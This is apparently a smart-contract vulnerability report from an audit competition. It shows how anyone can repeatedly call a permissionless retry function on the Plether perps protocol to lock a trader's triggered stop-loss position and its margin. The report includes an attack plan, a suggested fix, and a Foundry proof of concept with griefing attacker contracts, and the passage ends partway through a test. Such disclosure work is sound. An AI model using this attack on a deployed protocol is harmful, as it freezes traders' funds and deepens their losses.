# \#99485 [SC-High] Anyone can lock a triggered TP/SL position: a permissionless retry keeps the protection out of Latched, the only state in which the owner can amend its limits

**Submitted on Nov 13th 2026 at 21:04:24 UTC by @RowanDamisch for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #99485
- **Report Type:** Smart Contract
- **Report severity:** High
- **Target:** https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src
- **Impacts:**
  - Temporary freezing of funds for at least 24 hours

## Description

## Brief/Intro

`retryPositionProtectionClose` is permissionless, while the owner of a triggered TP/SL can change its close limits only while the protection is `Latched`. When a protection close fails on the trader's own limits, for example a stop-loss that the market jumps past, anyone can retry it right after every failure and keep the protection `Triggered`. The owner's amendment then always reverts, and cancelling the protection or closing the position in any other way is blocked while the protection is active. The position and its margin stay frozen for as long as the attacker continues and the price stays beyond the trader's limits. In the PoC a stop-loss is locked for 24 hours while the loss grows from 300 to 540 USDG, and a stop-loss that gaps on a Friday stays locked until the Sunday reopen, 51 hours, because the frozen weekend price cannot come back within the limits. Each retry costs about $0.03 and locks a position of any size. This is the unfinished part of the MED-9 fix: the trader's limits are retained, but the owner's way to change them cannot be reached. We suggest letting the owner amend while `Triggered`; with a one-function patch the owner exits during the attack.

## Vulnerability Details

When a triggered protection close fails, the protection relatches (`Latched`). The owner's only way out of a latched
protection is `amendLatchedPositionProtectionCloseLimits`, which works only while the protection is `Latched`. Every
ordinary exit is blocked while the protection is active: the owner cannot cancel it, cannot use cancel-and-close, and
cannot commit an ordinary close.

`retryPositionProtectionClose` is permissionless. An attacker who retries right after every failed close moves the
protection `Latched → Triggered` before the owner's next transaction lands. The owner's amendment then reverts, and the
position with its margin stays locked for as long as the attacker continues. The only way out is a processing and an
amendment sequenced back to back, which the product's own trading accounts cannot send (see "Owner's options").

**Example: a stop-loss through a gap** (`test_weekday_attack_stopLossLockedFor24h`).

1. A trader holds a 10,000 USDG LONG with a stop-loss at 1.02 and a 260 USDG loss cap: 200 USDG at the stop plus room
   for 0.5% slippage and fees.
2. The market jumps past the stop: the first price after it is 1.03. The protection fires, but a close at 1.03 would
   debit 304.12 USDG, more than the trader's cap. The close fails and the protection waits for the trader.
3. Without the attacker the trader now raises the cap and closes at the gap
   (`test_weekday_control_ownerAmendsAndExits`).
4. With the attacker, every failed close is retried at once. The trader's cap change reverts each time, and so do
   cancelling the protection and an ordinary close.
5. As long as the price does not come back within the cap, the attacker keeps the position locked for as long as it
   wants. The PoC holds it for 24 hours while the price keeps moving against the position; the price loss grows from
   300 to 540 USDG.

The same lock applies to a take-profit whose close fails on the trader's limits: the trader cannot take the profit or
move the margin out.

**The same lock over a weekend** (`test_weekend_attack_fridayStopLossLockedUntilReopen`). The stop-loss above gaps
through its cap on a Friday, at 12:00 New York in the PoC, and the attacker holds it through the afternoon. At 17:00
New York the market closes and the oracle freezes: the price stays at its last value, beyond the cap, and cannot come
back before the Sunday reopen. Every frozen attempt fails as well; the 50 bps frozen spread makes the close even
dearer (355.6 USDG against the 260 USDG cap). An ordinary trader has no way out for the whole weekend: the PoC holds
the position for 51 hours, from Friday noon to the Sunday reopen. A trader running a script that executes the attempt
and amends back to back can still leave in the frozen market; an ordinary user trading through the product or a
wallet cannot.

The frozen market also breaks fee ceilings set for live conditions. A take-profit triggered at Friday's close with a
ceiling of 3× the live fee fails on every frozen attempt (48.6 USDG against 10.8 USDG) and is locked for the whole
47-hour frozen period (`test_weekend_attack_lockedAllWeekend`).

The attacker needs no position and no capital: one `retryPositionProtectionClose` (about 669k gas in the PoC) after
each failed close. At the Arbitrum One gas price of 0.02 gwei and ETH at $1,931 (both read on 2026-11-13), one retry
costs about $0.03.

The cost does not depend on the position. A retry that locks a 10,000,000 USDG position uses the same gas as one that
locks a 10,000 USDG position (669,194 and 669,196, `test_depth_costIndependentOfPositionSize`). Any triggered
protection whose stored limits the market does not meet can be locked, whatever its size.

Severity: **High — Temporary freezing of funds for at least 24 hours.**

### Root cause

Scope: `packages/perps/src` at `a82d4fefb02768e5b3bddcc97dee371eee24fea8`.

1. **Retry is permissionless.** `retryPositionProtectionClose` (`PositionProtectionBook.sol:382-406`) checks only that
   the protection is `Latched`, the position matches and no order is pending. It commits a new attempt and sets
   `Triggered`.
2. **The owner's only exit requires `Latched`.** `amendLatchedPositionProtectionCloseLimits`
   (`PositionProtectionBook.sol:315-328`) reverts `OrderRouter__ProtectionNotLatched` in any other state and reverts
   `OrderRouter__PendingOrdersExist` while the attempt is pending.
3. **No other exit while the protection is active.**
   - `cancelPositionProtection` → `_cancel` accepts only `PendingOpen` and `Armed` (`PositionProtectionBook.sol:414-419`);
   - `cancelPositionProtectionAndCommitClose` requires `Armed` (`PositionProtectionBook.sol:346`);
   - ordinary commits revert `OrderRouter__ProtectionActive` (`OrderLiquidationBatchLogic.sol:314`).
4. **A failed attempt relatches.** `handleFailedProtectionAttempt` sets `Latched` when the position still matches
   (`PositionProtectionBook.sol:663-667`), including on expiry. Attempts carry zero bounty, the router's execution
   window (60 s in the repository test configuration, at most 1 hour by `OrderRouterAdmin.sol:31`) and the stored
   limits (`OrderLiquidationBatchLogic.sol:657-677`).
5. **Where the stored limits fail.** A close's gross account debit includes the consumed price loss
   (`CfdOrderPolicyEvaluatorBase.sol:410-411`), so a fill through the stop exceeds a loss cap; its explicit fees
   include the frozen spread (`CfdOrderPolicyEvaluatorBase.sol:416`), so a live-calibrated fee ceiling fails while the
   oracle is frozen.

Each failed attempt (points 4 and 5) leaves the protection `Latched` only until the next transaction. Point 1 lets
any address use that transaction to put it back into `Triggered`. The owner's exit in point 2 is then never
reachable from a separate transaction, and point 3 leaves no other exit.

### Attack

The attacker can pick targets in advance. Every protection's trigger prices and close limits are public
(`getPositionProtection`, `closeFinancialLimits`), so it can list the protections whose limits a gap or the frozen
spread would break before they trigger.

1. A protection has triggered and its close attempt fails on the trader's own limits:
   - a stop-loss through a gap, on any trading day or at the Sunday reopen; a lock started on a Friday carries
     through the frozen weekend;
   - a protection crossed at Friday's close with a fee ceiling set for live conditions, triggered with the last live
     tick, so its attempt can only run in the frozen market.
2. Whenever an attempt is processed (by the keeper at its first qualifying tick, by the owner, or by the attacker
   itself), it fails and the protection relatches. The attacker sees this in the sequencer feed and calls
   `retryPositionProtectionClose` within milliseconds. An owner's separately signed transaction arrives later, and
   Arbitrum sequences transactions first come, first served, so the retry lands first.
3. The protection is `Triggered` again with a fresh attempt carrying the same failing limits. Step 2 repeats.

The attacker can also process the attempt itself and retry in the same transaction: a small contract calls
`OrderRouter.executeOrder` and then `retryPositionProtectionClose`. Whenever the attacker is the one to process the
attempt, the protection never ends a transaction `Latched`, so the owner has no window at all
(`test_depth_executeAndRetryInOneTransaction`).

Without a keeper the attacker can drive the loop itself: expire the stale attempt and retry in one transaction, once
per execution window, with no oracle data.

### Known issues and prior audits

- Cecuro AI MED-9 ("Keepers can retry protection closes without the trader's financial limits") was resolved by
  copying the trader's limits into every retry and letting the owner amend them while `Latched`; tight limits "may
  prevent execution until conditions improve or the owner amends them". On `a82d4fef` that amendment cannot be reached
  while any address keeps retrying, so the fix is incomplete: the trader's limits are retained, but the owner's way to
  change them is not reachable.
- `SECURITY.md:1356-1359` covers liveness when nobody retries a latched protection. It does not cover a third party
  retrying to keep the owner out of `Latched`.
- The docs give the owner the amendment as the remedy for a latched protection (`CANONICAL_ENTRYPOINTS.md:145`) and
  tell protection workers not to "continuously queue the same failing attempt" (`DEPLOYMENT.md:421`). The contract
  does not enforce that guidance, and a third party doing exactly that keeps the remedy out of the owner's reach.
- The Scan report's "Protection trigger bounty is paid before a zero-bounty close is executed" concerns when the
  trigger bounty is paid, not the owner's exit from a latched protection.

## Impact Details

- **What is frozen.** The position's size, its pledged margin (1,986 USDG in the PoC) and its PnL: the owner cannot
  close, reduce, or move the margin out. Free settlement remains withdrawable; margin added later joins the locked
  position.
- **How long.** The protocol sets no upper bound. The lock lasts as long as the attacker continues and the stored
  limits cannot be met. It ends only when the price comes back within the trader's limits (the next attempt then
  closes the position, `test_boundary_priceBackWithinLimits`) or when the position is liquidated. While the market is
  frozen the price cannot move, so a lock carried into a weekend lasts at least until the Sunday reopen. The PoC stops
  at 24 hours (weekday) and at the reopen (51 hours from Friday noon); continuing costs the same per retry.
- **Stop-loss.** The trigger still fires, but the close it mandates is neutralised exactly when the market moves
  against the trader. If the price keeps moving, the position runs to liquidation instead of the stop, and the loss
  the stop-loss was set to cap is realised up to the whole margin.
- **Weekend.** The protocol keeps the frozen market open for closes ("frozen-market execution is intentionally
  liveness-first for risk reduction", `SECURITY.md:437`). For every protection the attacker holds into the weekend,
  it removes that close liveness until the market reopens.
- **Who can do it.** Any address, with no position and no capital, against a position of any size.
- **Owner's options.** The owner leaves only if their amendment is sequenced right after a processing, with nothing in
  between. The documented flow is the separate-transaction case: the remedy is the amendment
  (`CANONICAL_ENTRYPOINTS.md:145`), and execution is "a separate permissionless transaction" (`DEPLOYMENT.md:438`).
  (`packages/perps-aa*` are outside the audit scope; they are cited only for what a trader can send.)
  - **Product smart accounts** cannot process an attempt at all. The sponsored actions are trader actions only, with
    no order execution and no retry (`packages/perps-aa-client/src/types.ts:3-16`), and the sponsorship gateway must
    reject "keeper/admin methods" (`packages/perps-aa/SECURITY.md:35-36`). The owner's amendment is a sponsored
    UserOperation that reaches the chain seconds after the keeper's processing, after the attacker's retry.
  - **Externally owned accounts** that process the attempt and amend in separately signed transactions: the
    attacker's retry lands between them (both weekend attack tests). In a live market the owner cannot even process
    the fresh attempt in the same tick, because it becomes executable only from the next oracle tick (the weekday
    attack test).
  - **The exception.** An advanced trader who submits processing and amendment back to back, from a script or as one
    batch from a contract account, exits (`test_boundary_ownerProcessesAndAmendsBackToBack`). In a frozen market any
    pending attempt can be processed at once. In a live market the trader must process the fresh attempt at its first
    tick, before the keeper that services the queue head at that tick. This takes custom tooling: an ordinary user
    trading through the product or a wallet sends these actions as separate transactions.

**Why High.**

- **Weekdays.** In the stop-loss example the position and its margin stay locked for as long as the price stays beyond
  the trader's cap and the attacker keeps retrying; nothing in the protocol ends the lock earlier. The PoC holds it
  for 24 hours, the program's threshold for High.
- **Weekend.** A stop-loss locked on a Friday stays locked until the Sunday reopen: the frozen price cannot come back
  within the cap, so for an ordinary trader nothing ends the lock. The PoC holds it for 51 hours.

In both, the owner uses the documented exit (amend, then retry) in separate transactions. Owners on the product's
sponsored smart accounts have no way out through the product. The attacker pays one retry, about $0.03, per failed
close, and the same retry locks a position of any size: the frozen amount grows with the position, the cost does not.
This is the program's "Temporary freezing of funds for at least 24 hours".

## Suggested fix

Allow the owner to amend the close limits while the protection is `Triggered` as well as `Latched`. A trigger
requires the account to have no pending orders (`PositionProtectionBook.sol:532`) and ordinary commits are blocked
while the protection is active, so while `Triggered` the live attempt is the account's only pending order. The amended
limits apply from the next retry, so a third-party retry can no longer keep the owner out. We checked this with a
minimal patch (`fix.patch`, one function in `PositionProtectionBook.sol`):

```bash
git apply ../fix.patch
forge test --root packages/perps --match-path test/perps/spec/trader/ProtectionRetryLockFixCheck.t.sol --match-test "fix_|weekday_attack|weekend_attack" -vv
```

The fix-check suite inherits the PoC, so it runs the two fix tests and the three attack tests. Expected on the patched
code: `test_fix_weekdayOwnerAmendsWhileTriggeredAndExits` and `test_fix_weekendOwnerAmendsWhileTriggeredAndExits`
pass (the owner amends during the attack and the next attempt closes the position), and the three attack tests fail
with `next call did not revert as expected`, at the step that expects the owner's amendment to revert.

## References

- permissionless retry: [PositionProtectionBook.sol#L382-L406](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PositionProtectionBook.sol#L382-L406)
- owner amendment only while `Latched`, no pending order: [PositionProtectionBook.sol#L315-L328](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PositionProtectionBook.sol#L315-L328)
- cancel accepts only `PendingOpen`/`Armed`: [PositionProtectionBook.sol#L414-L419](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PositionProtectionBook.sol#L414-L419); cancel-and-close requires `Armed`: [PositionProtectionBook.sol#L346](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PositionProtectionBook.sol#L346)
- ordinary commits blocked while protection is active: [OrderLiquidationBatchLogic.sol#L314](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/router/OrderLiquidationBatchLogic.sol#L314)
- failed attempt relatches: [PositionProtectionBook.sol#L663-L667](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PositionProtectionBook.sol#L663-L667)
- attempts carry the stored limits: [OrderLiquidationBatchLogic.sol#L657-L677](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/router/OrderLiquidationBatchLogic.sol#L657-L677)
- execution window at most 1 hour: [OrderRouterAdmin.sol#L31](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/OrderRouterAdmin.sol#L31)
- gross account debit and explicit fees (frozen spread): [CfdOrderPolicyEvaluatorBase.sol#L410-L416](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/CfdOrderPolicyEvaluatorBase.sol#L410-L416)
- frozen window, Friday 17:00 to Sunday 16:59:59 New York: [CfdEngine.sol#L888-L892](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/CfdEngine.sol#L888-L892)
- trigger requires no pending orders: [PositionProtectionBook.sol#L532](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PositionProtectionBook.sol#L532)
- owner's documented remedy, amendment while `Latched`: [CANONICAL_ENTRYPOINTS.md#L145-L147](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/CANONICAL_ENTRYPOINTS.md?plain=1#L145-L147)
- workers must not continuously queue the same failing attempt: [DEPLOYMENT.md#L421](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/DEPLOYMENT.md?plain=1#L421); execution as a separate transaction: [DEPLOYMENT.md#L438](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/DEPLOYMENT.md?plain=1#L438)
- frozen-market execution is liveness-first: [SECURITY.md#L437](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/SECURITY.md?plain=1#L437)
- known limitation, nobody retries a latched protection: [SECURITY.md#L1356-L1359](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/SECURITY.md?plain=1#L1356-L1359)
- sponsored trader actions, outside the audit scope: [perps-aa-client/src/types.ts#L3-L16](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps-aa-client/src/types.ts#L3-L16); gateway rejects keeper methods: [perps-aa/SECURITY.md#L35-L36](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps-aa/SECURITY.md?plain=1#L35-L36)
- Cecuro AI audit, MED-9: [plether-ai-audit-report-2026-10-26.pdf](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/audits/plether-ai-audit-report-2026-10-26.pdf)


## Link to Proof of Concept

https://gist.github.com/w64267685-afk/954dcc8c97c4bf55e9fcf749cde417a0

## Proof of Concept

## Proof of Concept

One Foundry test file in the project's own test suite: `ProtectionRetryLockPoC.t.sol` extends the repository's `PositionProtectionTest` (its fixtures and frozen-calendar setup), runs without network and mocks only Pyth and USDG; no file under `src/` is changed. The keeper is the fixture's `EXECUTION_KEEPER`; the attacker is an arbitrary address calling `retryPositionProtectionClose`. Each test iteration is one exchange of the ordering in "Attack", sampled once per hour.

`fix.patch` and `ProtectionRetryLockFixCheck.t.sol` are our check of the suggested fix (Suggested fix).

All three files are in the [secret gist](https://gist.github.com/w64267685-afk/954dcc8c97c4bf55e9fcf749cde417a0).

#### Setup

The test files and `fix.patch` are in the [secret gist](https://gist.github.com/w64267685-afk/954dcc8c97c4bf55e9fcf749cde417a0); `ProtectionRetryLockPoC.t.sol` is also inlined at the end. Download the gist files into an empty directory, open a shell in that directory and run:

```bash
git clone https://github.com/immunefi-team/audit-comp-plether && cd audit-comp-plether
git checkout a82d4fefb02768e5b3bddcc97dee371eee24fea8
git submodule update --init --recursive
cp ../ProtectionRetryLockPoC.t.sol ../ProtectionRetryLockFixCheck.t.sol packages/perps/test/perps/spec/trader/
```

The test imports `./PositionProtection.t.sol`, so it goes next to it in `spec/trader/`. All commands below run from the repository root (`audit-comp-plether`).

#### Run

```bash
forge test --root packages/perps --match-path test/perps/spec/trader/ProtectionRetryLockPoC.t.sol --match-test "weekday_|weekend_|depth_|boundary_" -vv
```

Expected: 12 tests pass.

#### What each test shows

- Stop-loss through a gap (stop 1.02, loss cap 260 USDG, first tick 1.03):
  - `test_weekday_control_ownerAmendsAndExits` — without the attacker the fill fails on the cap, the owner amends and
    exits at the gap (304.12 USDG debited);
  - `test_weekday_attack_stopLossLockedFor24h` — 24 hours. Each hour the stale attempt is cleaned up and the attacker
    retries; at the next tick the keeper executes the fresh attempt, it fails on the cap
    (`ConstraintViolation(GrossAccountDebit)`, the debit growing with the price), and the attacker retries again.
    After each retry amend, cancel, cancel-and-close and an ordinary close revert, and the owner's own processing in
    the same tick finds no qualifying price. The price drifts to 1.054 and the price loss grows from 300 to 540 USDG;
    about 669k gas per retry.
  - `test_weekend_attack_fridayStopLossLockedUntilReopen` — the same stop-loss gapping on Friday at 12:00 New York:
    4 live hours, then all 47 frozen hours, 51 hours in total. Live attempts fail on the cap (304.12 USDG), frozen
    ones as well (355.6 USDG with the frozen spread). In the frozen market the keeper's and the owner's own executions
    both fail, and the attacker's retry lands before the owner's amendment.
- Fee ceiling in the frozen market (take-profit with a ceiling of 3× the live fee):
  - `test_weekend_control_liveCloseFitsCeiling` — triggered earlier in the live session, the same ceiling closes the
    position on the next live tick;
  - `test_weekend_control_ownerExitsWithoutAttacker` — triggered with the last live tick (10 s before the freeze), the
    first frozen execution fails on the spread; the owner raises the ceiling and exits during the weekend;
  - `test_weekend_attack_lockedAllWeekend` — same trigger, all 47 frozen hours. The first frozen execution and every
    later one, by the keeper or by the owner, fails on the spread (`ConstraintViolation(ExplicitFees)`, 48.6 USDG
    against the 10.8 USDG ceiling), and the attacker's retry lands before the owner's amendment.
- Depth:
  - `test_depth_whatIsFrozen` — pledged margin locked, free settlement withdrawable, added margin joins the lock;
  - `test_depth_expiryOnlyMode` — no keeper, no oracle data: one expire-and-retry per 60 s window;
  - `test_depth_executeAndRetryInOneTransaction` — the attacker executes each attempt itself (it fails on the cap) and
    retries in the same transaction; after each transaction the owner's amend, cancel and close revert;
  - `test_depth_costIndependentOfPositionSize` — a 10,000,000 USDG stop-loss position is locked by a retry of the same
    gas as a 10,000 USDG one (669,194 and 669,196).
- Boundaries: `test_boundary_priceBackWithinLimits` (a fill within the stored cap closes the position) and
  `test_boundary_ownerProcessesAndAmendsBackToBack` (an owner whose amendment directly follows the processing exits).

#### Fix check

```bash
git apply ../fix.patch
forge test --root packages/perps --match-path test/perps/spec/trader/ProtectionRetryLockFixCheck.t.sol --match-test "fix_|weekday_attack|weekend_attack" -vv
```

The fix-check suite inherits the PoC, so it runs the two fix tests and the three attack tests. Expected on the patched
code: `test_fix_weekdayOwnerAmendsWhileTriggeredAndExits` and `test_fix_weekendOwnerAmendsWhileTriggeredAndExits`
pass (the owner amends during the attack and the next attempt closes the position), and the three attack tests fail
with `next call did not revert as expected`, at the step that expects the owner's amendment to revert.

### Test code: `ProtectionRetryLockPoC.t.sol`

`ProtectionRetryLockFixCheck.t.sol` and `fix.patch` are in the gist.

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {PositionProtectionTest} from "./PositionProtection.t.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {IOrderRouterErrors} from "@plether/perps/interfaces/IOrderRouterErrors.sol";
import {IPositionProtectionActions} from "@plether/perps/interfaces/IPositionProtectionActions.sol";
import {PositionProtectionTypes} from "@plether/perps/interfaces/PositionProtectionTypes.sol";
import {console2} from "forge-std/console2.sol";

interface IExecRouter {
    function executeOrder(uint64 orderId, bytes[] calldata data)
        external
        payable
        returns (OrderV3Types.ExecutionResult memory);
}

/// Any address: execute the trader's failing attempt and retry it in the same transaction.
contract ExecuteAndRetry {
    function cycle(address router, address book, uint64 orderId, uint64 protectionId, bytes[] calldata data)
        external
        returns (uint64 nextOrderId)
    {
        IExecRouter(router).executeOrder(orderId, data);
        nextOrderId = IPositionProtectionActions(book).retryPositionProtectionClose(protectionId);
    }
}

/// Any address: expire the stale attempt and retry in one transaction (no oracle data, no execution).
contract ExpiryGriefer {
    function expireAndRetry(address router, address book, uint64 orderId, uint64 protectionId)
        external
        returns (uint64 nextOrderId)
    {
        IExecRouter(router).executeOrder(orderId, new bytes[](0));
        nextOrderId = IPositionProtectionActions(book).retryPositionProtectionClose(protectionId);
    }
}

/// A triggered protection whose close attempt fails relatches (`Latched`). The owner's only exit is amending the
/// close limits, which requires `Latched`. `retryPositionProtectionClose` is permissionless and moves the protection
/// back to `Triggered`. An attacker who retries right after every processed attempt keeps the protection out of
/// `Latched` at every point the owner's own transaction can land, so amend, cancel, cancel-and-close and an ordinary
/// close all revert, and the position with its margin stays locked.
///
/// Ordering model. On Arbitrum transactions are sequenced first come, first served. The keeper services the queue
/// head at the first qualifying oracle tick (live) or at once (frozen). The attacker watches the sequencer feed and
/// lands its retry right after each processing, before a separately signed owner transaction. Each test iteration is
/// one such exchange; the tests sample one per hour.
contract ProtectionRetryLockPoC is PositionProtectionTest {

    address internal constant ATTACKER = address(0xBAD);

    // Weekday stop-loss on a LONG (loses as the price rises). Notional 10,000 USDG, margin 2,000 USDG (5x).
    uint256 internal constant SL_PRICE = 102_000_000; // stop at 1.02: a 200 USDG loss
    uint256 internal constant GAP_PRICE = 103_000_000; // first tick after the stop: a 1% gap through it
    uint256 internal constant LOSS_CAP = 260e6; // max gross debit: 200 at the stop + 0.5% slippage + fees
    uint256 internal constant DRIFT_PER_HOUR = 100_000; // the price keeps moving against the position, +0.001/h

    // ---------------- helpers ----------------

    function _wideLimits() internal pure returns (PositionProtectionTypes.CloseFinancialLimits memory l) {
        l.maxExecutionNotionalAssets = 25_000e6;
        l.maxGrossAccountDebitAssets = 25_000e6;
        l.maxActionChargeAssets = 25_000e6;
        l.maxExplicitFeesAssets = 25_000e6;
    }

    function _status(uint64 protectionId) internal view returns (PositionProtectionTypes.PositionProtectionStatus) {
        return protectionViews.getPositionProtection(protectionId).status;
    }

    function _size(address a) internal view returns (uint256 s) {
        (s,,,,,,) = engine.positions(a);
    }

    function _lossAt(uint256 price) internal pure returns (uint256) {
        return (POSITION_SIZE * (price - MARK_PRICE)) / 1e20;
    }

    function _nextBlock(uint256 dt) internal {
        vm.warp(vm.getBlockTimestamp() + dt);
        vm.roll(vm.getBlockNumber() + 1);
    }

    function _closeRequest() internal view returns (OrderV3Types.OrderRequest memory q) {
        q.clientOrderId = keccak256(abi.encode("alice-close", vm.getBlockTimestamp()));
        q.side = CfdTypes.Side.LONG;
        q.sizeDelta = POSITION_SIZE;
        q.isClose = true;
        q.targetPrice = type(uint256).max;
        q.bounds.submitBy = uint64(vm.getBlockTimestamp() + router.maxExecutionWindowSeconds());
        q.bounds.executionWindowSeconds = uint32(router.maxExecutionWindowSeconds());
        q.bounds.allowedExecutionModes = 7;
        q.bounds.expectedConfigHash = router.lifecycleBook().currentExecutionConfigHash();
        q.bounds.maxExecutionBountyAssets = type(uint256).max;
        q.bounds.maxExecutionNotionalAssets = type(uint256).max;
        q.bounds.maxGrossAccountDebitAssets = type(uint256).max;
        q.bounds.maxActionChargeAssets = type(uint256).max;
        q.bounds.maxExplicitFeesAssets = type(uint256).max;
        q.bounds.maxPostPositionSize = type(uint256).max;
        q.bounds.maxPostLeverageBps = type(uint32).max;
    }

    function _assertStatus(uint64 protectionId, PositionProtectionTypes.PositionProtectionStatus s, string memory m)
        internal
        view
    {
        assertEq(uint8(_status(protectionId)), uint8(s), m);
    }

    /// Every owner action the product offers for a triggered protection, plus an ordinary close: all revert.
    function _ownerActionsRevert(uint64 protectionId) internal {
        _assertStatus(protectionId, PositionProtectionTypes.PositionProtectionStatus.Triggered, "attacker leaves it Triggered");
        OrderV3Types.OrderRequest memory q = _closeRequest();
        vm.prank(ALICE);
        vm.expectRevert(IOrderRouterErrors.OrderRouter__ProtectionNotLatched.selector);
        protectionActions.amendLatchedPositionProtectionCloseLimits(protectionId, _wideLimits());
        vm.prank(ALICE);
        vm.expectRevert();
        protectionActions.cancelPositionProtection(protectionId);
        vm.prank(ALICE);
        vm.expectRevert();
        protectionActions.cancelPositionProtectionAndCommitClose(protectionId, q);
        vm.prank(ALICE);
        vm.expectRevert();
        router.commitOrder(q);
        assertEq(_size(ALICE), POSITION_SIZE, "position stays open");
    }

    function _retryAsAttacker(uint64 protectionId) internal returns (uint64 attemptId, uint256 gasUsed) {
        uint256 g = gasleft();
        vm.prank(ATTACKER);
        attemptId = protectionActions.retryPositionProtectionClose(protectionId);
        gasUsed = g - gasleft();
    }

    // ---------------- weekday: stop-loss through a gap ----------------

    /// Alice: LONG 10,000 USDG notional, stop-loss at 1.02 with a 260 USDG loss cap. The first tick after the stop
    /// prints 1.03 (a 1% gap); the trigger queues the close attempt.
    function _stopLossSetup() internal returns (uint64 protectionId, uint64 attemptId) {
        _open(ALICE, CfdTypes.Side.LONG, POSITION_SIZE, POSITION_MARGIN_ASSETS, MARK_PRICE);
        PositionProtectionTypes.PositionProtectionParams memory params = _params(0, SL_PRICE);
        params.closeLimits.maxGrossAccountDebitAssets = LOSS_CAP;
        vm.prank(ALICE);
        protectionId = protectionActions.createPositionProtection(params);
        attemptId = _triggerAt(protectionId, GAP_PRICE);
    }

    /// The keeper executes the attempt at the gap price: the fill is beyond Alice's loss cap and relatches.
    function _keeperFailsAt(uint64 attemptId, uint256 price) internal {
        _nextBlock(2);
        vm.prank(EXECUTION_KEEPER);
        OrderV3Types.ExecutionResult memory r = router.executeOrder(attemptId, _mockPythUpdateData(price));
        assertEq(uint8(r.status), uint8(OrderV3Types.LifecycleStatus.Failed), "fill beyond the loss cap fails");
    }

    /// Control: without the attacker, Alice accepts the gap, amends the cap and exits at 1.03.
    function test_weekday_control_ownerAmendsAndExits() public {
        (uint64 protectionId, uint64 attemptId) = _stopLossSetup();
        uint256 balance0 = clearinghouse.balanceAssets(ALICE);
        _keeperFailsAt(attemptId, GAP_PRICE);
        _assertStatus(protectionId, PositionProtectionTypes.PositionProtectionStatus.Latched, "latched");

        vm.prank(ALICE);
        protectionActions.amendLatchedPositionProtectionCloseLimits(protectionId, _wideLimits());
        vm.prank(ALICE);
        uint64 retryId = protectionActions.retryPositionProtectionClose(protectionId);
        _nextBlock(2);
        vm.prank(EXECUTION_KEEPER);
        router.executeOrder(retryId, _mockPythUpdateData(GAP_PRICE));

        assertEq(_size(ALICE), 0, "owner exits at the gap");
        console2.log("loss cap (USDG, 6 dec)", LOSS_CAP);
        console2.log("settlement debited on exit at the gap (6 dec)", balance0 - clearinghouse.balanceAssets(ALICE));
    }

    /// Attack: 24 hours. The keeper keeps executing the attempt at each tick and it keeps failing on the cap; the
    /// attacker retries right after each processing. Alice cannot amend, cancel or close, and processing the fresh
    /// attempt herself in the same tick does nothing: it is executable only from the next oracle tick.
    function test_weekday_attack_stopLossLockedFor24h() public {
        (uint64 protectionId, uint64 attemptId) = _stopLossSetup();
        uint256 price = GAP_PRICE;
        uint256 retryGas;
        uint256 retries;
        uint256 g;

        _keeperFailsAt(attemptId, price);
        (attemptId, g) = _retryAsAttacker(protectionId);
        retryGas += g;
        ++retries;
        _ownerActionsRevert(protectionId);

        for (uint256 h = 1; h <= 24; ++h) {
            _nextBlock(1 hours);
            price += DRIFT_PER_HOUR;
            // the stale attempt is cleaned up and the attacker retries at once
            vm.prank(EXECUTION_KEEPER);
            router.executeOrder(attemptId, _mockPythUpdateData(price));
            (attemptId, g) = _retryAsAttacker(protectionId);
            retryGas += g;
            ++retries;
            // the first qualifying tick: the keeper executes, the fill is beyond the cap, the attacker retries
            _keeperFailsAt(attemptId, price);
            (attemptId, g) = _retryAsAttacker(protectionId);
            retryGas += g;
            ++retries;

            _ownerActionsRevert(protectionId);
            vm.prank(ALICE);
            try router.executeOrder(attemptId, _priceData(price)) {} catch {}
            _assertStatus(
                protectionId,
                PositionProtectionTypes.PositionProtectionStatus.Triggered,
                "the fresh attempt is not executable before the next tick"
            );
            vm.prank(ALICE);
            vm.expectRevert(IOrderRouterErrors.OrderRouter__ProtectionNotLatched.selector);
            protectionActions.amendLatchedPositionProtectionCloseLimits(protectionId, _wideLimits());
        }

        console2.log("hours locked", uint256(24));
        console2.log("attacker retries / avg gas per retry", retries, retryGas / retries);
